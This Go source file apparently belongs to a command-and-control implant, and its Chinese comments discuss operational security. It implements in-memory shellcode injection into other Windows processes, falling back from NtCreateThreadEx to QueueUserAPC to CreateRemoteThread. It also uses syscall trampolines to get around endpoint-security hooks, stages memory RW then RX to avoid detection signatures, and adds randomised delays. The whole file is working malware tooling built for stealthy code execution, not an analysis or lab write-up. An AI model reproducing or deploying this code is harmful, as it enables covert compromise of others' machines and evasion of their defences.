//go:build windows

package commands

import (
	"fmt"
	"implant/core/config"
	"implant/core/evasion"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// InjectShellcode 将 shellcode 注入指定进程（纯内存，不落盘）。
// 【OPSEC 注入链】默认 auto 优先纯 ntdll 路径，全程不调用 kernel32 CreateRemoteThread：
//   1. NtCreateThreadEx —— ntdll syscall 直接创建远程线程（绕过 userland hook）
//   2. QueueUserAPC —— NtCreateThreadEx(挂起) + QueueUserAPC + ResumeThread
//   3. CreateRemoteThread —— 最后手段（显式 :crt 或自动回退）
// 通用防护（沿用并强化）：
//   - 最小权限句柄（无 PROCESS_ALL_ACCESS / THREAD_ALL_ACCESS）
//   - 内存先 RW 写入，执行前改 RX（消除 RWX 特征）；分配/写入/改保护在 syscall 模式下
//     走 NtXxx trampoline，见 remotemem_windows.go
//   - 写后校验写入字节数；失败输出 LastError 细节
//   - 注入前随机延迟 0-3s（打破固定时序特征）
// tech: auto(默认) | ntc | apc | crt
var criticalProcessNames = map[string]bool{
	"system": true, "registry": true, "smss.exe": true, "csrss.exe": true,
	"wininit.exe": true, "winlogon.exe": true, "lsass.exe": true, "services.exe": true,
	"lsm.exe": true, "svchost.exe": true, "explorer.exe": false, // explorer 允许注入但需警告
}

func isCriticalPID(pid int) bool {
	if pid < 500 && pid != 0 {
		return true
	}
	if pid == 4 {
		return true
	}
	// 按进程名二次校验（pid>500 的关键进程如 csrss/winlogon/lsass 600+）
	if name, err := getProcessImageName(pid); err == nil {
		lower := strings.ToLower(name)
		// 提取文件名
		if idx := strings.LastIndex(lower, "\\"); idx >= 0 {
			lower = lower[idx+1:]
		}
		if critical, ok := criticalProcessNames[lower]; ok && critical {
			return true
		}
	}
	return false
}

func getProcessImageName(pid int) (string, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	openProcess := kernel32.NewProc("OpenProcess")
	queryFullProcessImageName := kernel32.NewProc("QueryFullProcessImageNameW")
	closeHandle := kernel32.NewProc("CloseHandle")
	const processQueryLimitedInformation = 0x1000
	h, _, _ := openProcess.Call(processQueryLimitedInformation, 0, uintptr(pid))
	if h == 0 {
		return "", fmt.Errorf("OpenProcess")
	}
	defer closeHandle.Call(h)
	buf := make([]uint16, 1024)
	size := uint32(len(buf))
	r, _, _ := queryFullProcessImageName.Call(h, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)))
	if r == 0 {
		return "", fmt.Errorf("QueryFullProcessImageName")
	}
	return syscall.UTF16ToString(buf[:size]), nil
}

func isTargetWow64(pid int) (bool, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	openProcess := kernel32.NewProc("OpenProcess")
	isWow64Process := kernel32.NewProc("IsWow64Process")
	const processQueryLimitedInfo = 0x1000
	hProc, _, _ := openProcess.Call(uintptr(processQueryLimitedInfo), 0, uintptr(pid))
	if hProc == 0 {
		return false, fmt.Errorf("OpenProcess 失败")
	}
	defer syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle").Call(hProc)
	var wow64 uint32
	ret, _, _ := isWow64Process.Call(hProc, uintptr(unsafe.Pointer(&wow64)))
	if ret == 0 {
		return false, fmt.Errorf("IsWow64Process 失败")
	}
	return wow64 != 0, nil
}

func InjectShellcode(shellcode []byte, pid int, tech string) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("shellcode 为空")
	}
	if pid <= 0 {
		return nil, fmt.Errorf("无效 PID: %d", pid)
	}
	if isCriticalPID(pid) {
		return nil, fmt.Errorf("拒绝注入关键系统进程 PID %d (CRITICAL_PROCESS_DIED 风险)", pid)
	}
	if wow64, err := isTargetWow64(pid); err == nil && wow64 {
		return nil, fmt.Errorf("目标进程 PID %d 为 32 位, 当前 shellcode 为 64 位, 请生成 x86 载荷或选择 64 位目标 (Wow64 检测)", pid)
	}
	if tech == "" {
		tech = config.InjectTechDefault()
	}
	switch tech {
	case "auto", "ntc", "apc", "crt":
	default:
		return nil, fmt.Errorf("未知注入技术: %s（支持 auto/ntc/apc/crt）", tech)
	}

	// OPSEC：注入前随机延迟 0-3s，打破固定时序特征
	if tech == "auto" || tech == "ntc" {
		time.Sleep(time.Duration(randN(0, 3000)) * time.Millisecond)
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	closeHandle := kernel32.NewProc("CloseHandle")
	getLastError := kernel32.NewProc("GetLastError")

	const (
		processCreateThread = 0x0002
		processQueryInfo    = 0x0400
		processVMOperation  = 0x0008
		processVMWrite      = 0x0020
		processVMRead       = 0x0010
		minProcessAccess    = processCreateThread | processQueryInfo | processVMOperation | processVMWrite | processVMRead
	)

	// 打开/分配/写入/改保护统一走 remoteMemory：syscall 模式优先 NtXxx trampoline，
	// 不可用时安静回退 kernel32（规避手段缺失不该让整条注入链失效）。
	rm := newRemoteMemory()
	hProc, err := rm.OpenProcess(pid, minProcessAccess)
	if err != nil {
		return nil, fmt.Errorf("打开目标进程失败 (pid=%d): %v", pid, err)
	}
	defer rm.Close(hProc)

	addr, written, err := stagePayload(rm, hProc, shellcode)
	if err != nil {
		return nil, err
	}

	used := tech
	switch tech {
	case "ntc":
		if err := injectNtCreateThreadEx(ntdll, hProc, addr, getLastError); err != nil {
			return nil, err
		}
	case "apc":
		if err := injectQueueUserAPC(ntdll, kernel32, hProc, addr, getLastError, closeHandle); err != nil {
			return nil, err
		}
	case "crt":
		createRemoteThread := kernel32.NewProc("CreateRemoteThread")
		thread, _, _ := createRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
		if thread == 0 {
			return nil, fmt.Errorf("CreateRemoteThread 失败 (LastError=%d)", lastErrValue(getLastError))
		}
		defer closeHandle.Call(thread)
	default: // auto：NtCreateThreadEx → QueueUserAPC → CreateRemoteThread 回退链
		used = "ntc"
		if err := injectNtCreateThreadEx(ntdll, hProc, addr, getLastError); err == nil {
			break
		}
		used = "apc"
		if err := injectQueueUserAPC(ntdll, kernel32, hProc, addr, getLastError, closeHandle); err == nil {
			break
		}
		used = "crt"
		createRemoteThread := kernel32.NewProc("CreateRemoteThread")
		thread, _, _ := createRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
		if thread == 0 {
			return nil, fmt.Errorf("全部注入技术失败（最后手段 CreateRemoteThread: LastError=%d）", lastErrValue(getLastError))
		}
		defer closeHandle.Call(thread)
	}

	return []byte(fmt.Sprintf("✅ 内存注入成功: pid=%d, technique=%s, 地址=%x, 长度=%d, 写入=%d（RW->RX，最小权限句柄，无落盘）\n后端=%s 调用序列=%s",
		pid, used, addr, len(shellcode), written, rm.Backend(), strings.Join(rm.Trace(), " | "))), nil
}

// stagePayload 把 shellcode 落到目标进程：RW 分配 → 写入 → 校验 → 改 RX。
//
// 顺序不能换：
//   - 先 RX 就写不进去；
//   - 写完不改 RX 就在目标进程留一块可写可执行内存（RWX 是最刺眼的内存特征）；
//   - 不校验写入字节数，会"报成功但只写进去一半"，症状是注入后进程无反应。
//
// 拆成独立函数是为了让"分配/写入/改保护的实际参数与顺序"能被单测钉住 ——
// 这三步走错任何一步都没有编译期或运行期提示。
func stagePayload(rm remoteMemory, h uintptr, shellcode []byte) (addr, written uintptr, err error) {
	if len(shellcode) == 0 {
		return 0, 0, fmt.Errorf("shellcode 为空")
	}
	addr, err = rm.Alloc(h, 0, uintptr(len(shellcode)), pageReadWrite)
	if err != nil {
		return 0, 0, fmt.Errorf("分配 payload 内存(RW)失败: %v", err)
	}
	written, err = rm.Write(h, addr, shellcode)
	if err != nil {
		return 0, 0, fmt.Errorf("写入 payload 失败: %v", err)
	}
	if written != uintptr(len(shellcode)) {
		return 0, 0, fmt.Errorf("写入不完整: 期望 %d, 实际 %d", len(shellcode), written)
	}
	if _, err = rm.Protect(h, addr, uintptr(len(shellcode)), pageExecuteRead); err != nil {
		return 0, 0, fmt.Errorf("payload 改为 RX 失败: %v", err)
	}
	return addr, written, nil
}

// injectNtCreateThreadEx NtCreateThreadEx 直接创建远程线程。
// syscall 模式（direct/indirect）时经 evasion trampoline 执行（绕过 ntdll 开头 hook）；
// 否则回退纯 ntdll 路径（绕过 kernel32 hook）。
func injectNtCreateThreadEx(ntdll *syscall.LazyDLL, hProc, addr uintptr, getLastError *syscall.LazyProc) error {
	if mode := config.SyscallMode(); mode != "none" {
		var hThread uintptr
		status, err := evasion.Syscall("NtCreateThreadEx",
			uintptr(unsafe.Pointer(&hThread)),
			uintptr(0x1FFFFF), // THREAD_ALL_ACCESS
			0,
			hProc,
			addr,
			0,
			0,
			0, // 直接启动
			0,
			0,
		)
		if err != nil {
			return fmt.Errorf("NtCreateThreadEx(syscall %s) 初始化失败: %v", mode, err)
		}
		if status != 0 || hThread == 0 {
			return fmt.Errorf("NtCreateThreadEx(syscall %s) 失败 (status=0x%x, LastError=%d)", mode, status, lastErrValue(getLastError))
		}
		return nil
	}
	ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")
	if err := ntCreateThreadEx.Find(); err != nil {
		return fmt.Errorf("解析 NtCreateThreadEx 失败: %v", err)
	}
	var hThread uintptr
	status, _, _ := ntCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		uintptr(0x1FFFFF), // THREAD_ALL_ACCESS（句柄仅保留于调用方本地）
		0,
		hProc,
		addr,
		0,
		0,
		0, // 直接启动
		0,
		0,
		0,
	)
	if status != 0 || hThread == 0 {
		return fmt.Errorf("NtCreateThreadEx 失败 (status=0x%x, LastError=%d)", status, lastErrValue(getLastError))
	}
	return nil
}

// injectQueueUserAPC 挂起线程 + QueueUserAPC + ResumeThread（纯 ntdll 线程创建 + APC 分发）
func injectQueueUserAPC(ntdll, kernel32 *syscall.LazyDLL, hProc, addr uintptr, getLastError, closeHandle *syscall.LazyProc) error {
	ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")
	queueUserAPC := kernel32.NewProc("QueueUserAPC")
	resumeThread := kernel32.NewProc("ResumeThread")

	var hThread uintptr
	var status uintptr
	var serr error
	if mode := config.SyscallMode(); mode != "none" {
		status, serr = evasion.Syscall("NtCreateThreadEx",
			uintptr(unsafe.Pointer(&hThread)),
			0x1FFFFF,
			0,
			hProc,
			0, // 挂起线程：无起始地址
			0,
			0,
			0x00000004, // CREATE_SUSPENDED
			0,
			0,
			0,
		)
		if serr != nil {
			return fmt.Errorf("NtCreateThreadEx(挂起,syscall) 初始化失败: %v", serr)
		}
	} else {
		status, _, _ = ntCreateThreadEx.Call(
			uintptr(unsafe.Pointer(&hThread)),
			0x1FFFFF,
			0,
			hProc,
			0, // 挂起线程：无起始地址
			0,
			0,
			0x00000004, // CREATE_SUSPENDED
			0,
			0,
			0,
		)
	}
	if status != 0 || hThread == 0 {
		return fmt.Errorf("NtCreateThreadEx(挂起) 失败 (status=0x%x, LastError=%d)", status, lastErrValue(getLastError))
	}
	defer closeHandle.Call(hThread)

	apcRet, _, _ := queueUserAPC.Call(addr, hThread, 0)
	if apcRet == 0 {
		return fmt.Errorf("QueueUserAPC 失败 (LastError=%d)", lastErrValue(getLastError))
	}

	resumeRet, _, _ := resumeThread.Call(hThread)
	if resumeRet == 0xFFFFFFFF {
		return fmt.Errorf("ResumeThread 失败 (LastError=%d)", lastErrValue(getLastError))
	}
	return nil
}

// lastErrValue 获取 LastError 值
func lastErrValue(proc *syscall.LazyProc) uintptr {
	r1, _, _ := proc.Call()
	return r1
}

// randN 返回 [min, max] 区间随机数
func randN(min, max int64) int64 {
	if max <= min {
		return min
	}
	return time.Now().UnixNano()%(max-min+1) + min
}

// parseInjectMemHeader 解析内存注入包头的 pid/tech 字段（供 services 层复用）
func parseInjectMemHeader(pidBytes, techBytes []byte) (int, string, error) {
	pid, err := strconv.Atoi(strings.TrimSpace(string(pidBytes)))
	if err != nil || pid <= 0 {
		return 0, "", fmt.Errorf("无效 PID: %q", string(pidBytes))
	}
	return pid, strings.TrimSpace(string(techBytes)), nil
}
